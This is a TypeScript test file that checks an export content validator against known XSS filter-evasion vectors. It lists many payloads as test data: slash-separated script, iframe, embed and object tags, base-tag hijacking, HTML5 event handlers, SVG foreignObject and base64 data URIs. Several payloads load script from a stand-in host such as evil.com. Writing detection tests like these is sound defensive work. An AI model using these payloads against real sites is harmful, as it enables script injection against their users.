/**
 * Bypass-specific tests for ExportContentValidator detection gaps.
 *
 * Tests known XSS bypass vectors that exploit pattern-matching weaknesses:
 *   1. Slash-separator bypass: `<script/src=...>` evades `<script[\s>]`
 *   2. HTML5 event handler expansion: onpointerdown, ontoggle, etc.
 *   3. <base> tag injection for href hijacking
 *   4. Novel obfuscation vectors from OWASP XSS Filter Evasion Cheat Sheet
 *
 * These tests verify that the pattern fixes close known detection gaps.
 */

import {
  validateExportPayload,
  validateSceneGraphForExport,
} from '../export-content-validator';
import type { SceneGraph } from '../../types/diagram';

function hasHighFinding(findings: Array<{ severity: string }>): boolean {
  return findings.some((f) => f.severity === 'high');
}

function hasMediumFinding(findings: Array<{ severity: string }>): boolean {
  return findings.some((f) => f.severity === 'medium');
}

function makeCleanScene(): SceneGraph {
  return {
    type: 'flow',
    nodes: [
      { id: 'node-1', label: 'Start' },
      { id: 'node-2', label: 'End' },
    ],
    edges: [{ from: 'node-1', to: 'node-2', label: 'next' }],
    startMs: 0,
    durationMs: 5000,
    summary: 'A flow diagram',
    keyphrases: ['start', 'end'],
  };
}

// ---------------------------------------------------------------------------
// Tests: slash-separator bypass vectors
// ---------------------------------------------------------------------------

describe('Bypass: slash-separator after tag name', () => {
  const slashBypassPayloads: Array<{ payload: string; pattern: string }> = [
    { payload: '<script/src=//evil.com/x.js>', pattern: 'script-tag' },
    { payload: '<script>alert(1)</script>', pattern: 'script-tag' },
    { payload: '<script\nsrc=//evil.com>', pattern: 'script-tag' },
    { payload: '<iframe/src="javascript:alert(1)">', pattern: 'iframe-tag' },
    { payload: '<iframe/src=//evil.com>', pattern: 'iframe-tag' },
    { payload: '<embed/src="data:text/html,<script>alert(1)</script>">', pattern: 'embed-tag' },
    { payload: '<embed/src=evil.swf>', pattern: 'embed-tag' },
    { payload: '<object/data="javascript:alert(1)">', pattern: 'object-tag' },
    { payload: '<object/data=evil.swf>', pattern: 'object-tag' },
    { payload: '<meta/http-equiv="refresh" content="0;url=//evil.com">', pattern: 'meta-tag' },
  ];

  test.each(slashBypassPayloads)(
    'detects "$payload" (expected pattern: $pattern)',
    ({ payload }) => {
      const result = validateExportPayload({ data: payload });
      expect(hasAnyFinding(result.findings)).toBe(true);
    },
  );

  test.each(slashBypassPayloads)(
    'high-severity payload blocks in strict mode: "$payload"',
    ({ payload, pattern }) => {
      const result = validateExportPayload({ data: payload }, undefined, {
        strict: true,
      });
      // script-tag, iframe-tag, embed-tag, object-tag are all high-severity
      if (pattern !== 'meta-tag') {
        expect(hasHighFinding(result.findings)).toBe(true);
        expect(result.passed).toBe(false);
      } else {
        // meta-tag is medium severity, does not block in strict mode
        expect(hasMediumFinding(result.findings)).toBe(true);
        expect(result.passed).toBe(true);
      }
    },
  );
});

// ---------------------------------------------------------------------------
// Tests: <base> tag injection
// ---------------------------------------------------------------------------

describe('Bypass: <base> tag injection', () => {
  const basePayloads = [
    '<base href="javascript:alert(1)">',
    '<base href="//evil.com/">',
    '<base target="_blank" href="//evil.com">',
    '<base/href=//evil.com>',
  ];

  test.each(basePayloads)('detects base tag: "%s"', (payload) => {
    const result = validateExportPayload({ data: payload });
    expect(hasHighFinding(result.findings)).toBe(true);
    expect(result.findings.some((f) => f.pattern === 'base-tag')).toBe(true);
  });

  test.each(basePayloads)('blocks in strict mode: "%s"', (payload) => {
    const result = validateExportPayload({ data: payload }, undefined, {
      strict: true,
    });
    expect(result.passed).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Tests: expanded HTML5 event handlers
// ---------------------------------------------------------------------------

describe('Bypass: expanded HTML5 event handlers', () => {
  const html5EventHandlers = [
    'ontoggle=alert(1)',
    'onpointerdown=alert(1)',
    'onpointerup=alert(1)',
    'onpointermove=alert(1)',
    'onpointerover=alert(1)',
    'onpointerout=alert(1)',
    'onpointerenter=alert(1)',
    'onpointerleave=alert(1)',
    'onanimationstart=alert(1)',
    'onanimationend=alert(1)',
    'onanimationiteration=alert(1)',
    'ontransitionend=alert(1)',
    'oninput=alert(1)',
    'onchange=alert(1)',
    'onsubmit=alert(1)',
    'onreset=alert(1)',
    'ondrag=alert(1)',
    'ondragstart=alert(1)',
    'ondragend=alert(1)',
    'ondrop=alert(1)',
    'onwheel=alert(1)',
    'onscroll=alert(1)',
    'onresize=alert(1)',
    'oncontextmenu=alert(1)',
    'oncopy=alert(1)',
    'onpaste=alert(1)',
    'oncut=alert(1)',
    'oncanplay=alert(1)',
    'onplay=alert(1)',
    'onplaying=alert(1)',
    'onseeked=alert(1)',
    'onseeking=alert(1)',
    'onwaiting=alert(1)',
    'onloadeddata=alert(1)',
    'onloadedmetadata=alert(1)',
    'onloadstart=alert(1)',
    'ondurationchange=alert(1)',
    'onended=alert(1)',
    'onabort=alert(1)',
    'onhashchange=alert(1)',
    'ononline=alert(1)',
    'onoffline=alert(1)',
    'onpagehide=alert(1)',
    'onpageshow=alert(1)',
    'onpopstate=alert(1)',
    'onstorage=alert(1)',
    'onunload=alert(1)',
    'onbeforeunload=alert(1)',
    'onafterprint=alert(1)',
    'onbeforeprint=alert(1)',
    'onmessage=alert(1)',
    'onsecuritypolicyviolation=alert(1)',
    'onratechange=alert(1)',
    'ontimeupdate=alert(1)',
    'onvolumechange=alert(1)',
    'onprogress=alert(1)',
    'onstalled=alert(1)',
    'onsuspend=alert(1)',
  ];

  test.each(html5EventHandlers)('detects event handler: "%s"', (payload) => {
    const result = validateExportPayload({ data: payload });
    expect(hasMediumFinding(result.findings)).toBe(true);
    expect(result.findings.some((f) => f.pattern === 'event-handler')).toBe(true);
  });

  test.each(html5EventHandlers)(
    'passes in strict mode (medium severity): "%s"',
    (payload) => {
      const result = validateExportPayload({ data: payload }, undefined, {
        strict: true,
      });
      // Event handlers are medium severity, do not block in strict mode
      expect(result.passed).toBe(true);
    },
  );
});

// ---------------------------------------------------------------------------
// Tests: event handlers in realistic HTML attribute context
// ---------------------------------------------------------------------------

describe('Bypass: event handlers in HTML attribute context', () => {
  const htmlAttributePayloads = [
    '<div ontoggle=alert(1) open>x</div>',
    '<details ontoggle=alert(1) open>x</details>',
    '<input oninput=alert(1)>',
    '<form onsubmit=alert(1)>',
    '<button onpointerdown=alert(1)>Click</button>',
    '<video><source onerror=alert(1)>',
    '<body onresize=alert(1)>',
    '<svg><rect onpointerdown=alert(1) /></svg>',
  ];

  test.each(htmlAttributePayloads)(
    'detects event handler in HTML: "%s"',
    (payload) => {
      const result = validateExportPayload({ data: payload });
      expect(hasAnyFinding(result.findings)).toBe(true);
    },
  );
});

// ---------------------------------------------------------------------------
// Tests: event handlers in SceneGraph fields
// ---------------------------------------------------------------------------

describe('Bypass: event handlers detected in SceneGraph fields', () => {
  test('ontoggle in node label is detected', () => {
    const scene = makeCleanScene();
    scene.nodes[0].label = '<details ontoggle=alert(1) open>x';
    const result = validateSceneGraphForExport(scene);
    expect(result.findings.some((f) => f.pattern === 'event-handler')).toBe(true);
    expect(result.findings.some((f) => f.field === 'nodes[0].label')).toBe(true);
  });

  test('onpointerdown in summary is detected', () => {
    const scene = makeCleanScene();
    scene.summary = 'Check this <b onpointerdown=alert(1)>item</b>';
    const result = validateSceneGraphForExport(scene);
    expect(result.findings.some((f) => f.pattern === 'event-handler')).toBe(true);
  });

  test('onanimationstart in edge label is detected', () => {
    const scene = makeCleanScene();
    scene.edges[0].label = '<div onanimationstart=alert(1)>x</div>';
    const result = validateSceneGraphForExport(scene);
    expect(result.findings.some((f) => f.pattern === 'event-handler')).toBe(true);
    expect(result.findings.some((f) => f.field === 'edges[0].label')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Tests: combined bypass vectors (slash + event handler)
// ---------------------------------------------------------------------------

describe('Bypass: combined slash-separator + event handler', () => {
  const combinedPayloads = [
    '<iframe/src="javascript:alert(1)" onload=alert(1)>',
    '<embed/src=evil.swf onerror=alert(1)>',
    '<object/data=evil.swf onload=alert(1)>',
    '<script/src=//evil.com onload=alert(1)>',
  ];

  test.each(combinedPayloads)('multiple findings for combined payload: "%s"', (payload) => {
    const result = validateExportPayload({ data: payload });
    // Should have at least one high-severity finding (tag) and one medium (event-handler)
    expect(hasHighFinding(result.findings)).toBe(true);
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
  });

  test.each(combinedPayloads)('blocks in strict mode: "%s"', (payload) => {
    const result = validateExportPayload({ data: payload }, undefined, {
      strict: true,
    });
    expect(result.passed).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Tests: OWASP XSS Filter Evasion vectors
// ---------------------------------------------------------------------------

describe('Bypass: OWASP XSS Filter Evasion Cheat Sheet vectors', () => {
  const owaspVectors: Array<{ payload: string; description: string; expectHigh: boolean }> = [
    {
      payload: '<script/src=//evil.com/x.js></script>',
      description: 'Script tag with slash separator',
      expectHigh: true,
    },
    {
      payload: '<iframe/src="javascript:alert(1)">',
      description: 'Iframe with slash separator',
      expectHigh: true,
    },
    {
      payload: '<svg><script>alert(1)</script></svg>',
      description: 'SVG with embedded script',
      expectHigh: true,
    },
    {
      payload: '<svg/onload=alert(1)>',
      description: 'SVG with onload via slash',
      expectHigh: true,
    },
    {
      payload: '<base href="javascript:alert(1)//">',
      description: 'Base tag with javascript protocol',
      expectHigh: true,
    },
    {
      payload: '<object/data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
      description: 'Object tag with data URI',
      expectHigh: true,
    },
    {
      payload: '<embed/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>',
      description: 'Embed tag with slash separator and data URI',
      expectHigh: true,
    },
    {
      payload: '<meta/http-equiv=refresh content=0;url=javascript:alert(1)>',
      description: 'Meta refresh with slash separator',
      expectHigh: false, // meta-tag is medium, javascript-protocol is high
    },
  ];

  test.each(owaspVectors)('OWASP vector: "$description"', ({ payload, expectHigh }) => {
    const result = validateExportPayload({ data: payload });
    expect(hasAnyFinding(result.findings)).toBe(true);
    if (expectHigh) {
      expect(hasHighFinding(result.findings)).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Tests: SVG foreignObject bypass vector
// ---------------------------------------------------------------------------

describe('Bypass: SVG <foreignObject> element', () => {
  const foreignObjectPayloads = [
    '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>',
    '<foreignObject><body onload=alert(1)></foreignObject>',
    '<foreignObject width="100" height="50"><iframe src=//evil.com></foreignObject>',
    '<foreignObject/src=data:text/html,<script>alert(1)</script>>',
  ];

  test.each(foreignObjectPayloads)(
    'detects foreignObject tag: "%s"',
    (payload) => {
      const result = validateExportPayload({ data: payload });
      expect(hasHighFinding(result.findings)).toBe(true);
      expect(
        result.findings.some((f) => f.pattern === 'foreign-object-tag'),
      ).toBe(true);
    },
  );

  test.each(foreignObjectPayloads)(
    'blocks in strict mode: "%s"',
    (payload) => {
      const result = validateExportPayload({ data: payload }, undefined, {
        strict: true,
      });
      expect(result.passed).toBe(false);
    },
  );

  test('foreignObject in SceneGraph node label is detected', () => {
    const scene = makeCleanScene();
    scene.nodes[0].label =
      '<svg><foreignObject><script>alert(1)</script></foreignObject></svg>';
    const result = validateSceneGraphForExport(scene);
    expect(
      result.findings.some((f) => f.pattern === 'foreign-object-tag'),
    ).toBe(true);
    expect(result.findings.some((f) => f.field === 'nodes[0].label')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Tests: executable data URI MIME types (SVG, XHTML)
// ---------------------------------------------------------------------------

describe('Bypass: executable data URI MIME types', () => {
  const dataUriPayloads: Array<{ payload: string; pattern: string }> = [
    {
      payload: 'url("data:image/svg+xml,<svg onload=alert(1)>)',
      pattern: 'data-svg-uri',
    },
    {
      payload: "url('data:image/svg+xml,<svg/onload=alert(1)>)",
      pattern: 'data-svg-uri',
    },
    {
      payload: 'url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)',
      pattern: 'data-svg-uri',
    },
    {
      payload: 'url("data:application/xhtml+xml,<script>alert(1)</script>")',
      pattern: 'data-xhtml-uri',
    },
    {
      payload: 'url(data:application/xhtml+xml,<body onload=alert(1)>)',
      pattern: 'data-xhtml-uri',
    },
  ];

  test.each(dataUriPayloads)(
    'detects executable data URI: "$pattern"',
    ({ payload, pattern }) => {
      const result = validateExportPayload({ data: payload });
      expect(hasMediumFinding(result.findings)).toBe(true);
      expect(result.findings.some((f) => f.pattern === pattern)).toBe(true);
    },
  );

  test.each(dataUriPayloads)(
    'detects in CSS-style field: "$pattern"',
    ({ payload }) => {
      const scene = makeCleanScene();
      scene.nodes[0].label = `background: ${payload}`;
      const result = validateSceneGraphForExport(scene);
      expect(result.findings.length).toBeGreaterThan(0);
    },
  );

  test('data:image/svg+xml in SceneGraph is detected', () => {
    const scene = makeCleanScene();
    scene.nodes[0].meta = {
      style: 'background: url("data:image/svg+xml,<svg onload=alert(1)>)',
    };
    const result = validateSceneGraphForExport(scene);
    expect(
      result.findings.some((f) => f.pattern === 'data-svg-uri'),
    ).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// Helper re-export for tests above
// ---------------------------------------------------------------------------

function hasAnyFinding(findings: Array<{ severity: string }>): boolean {
  return findings.length > 0;
}
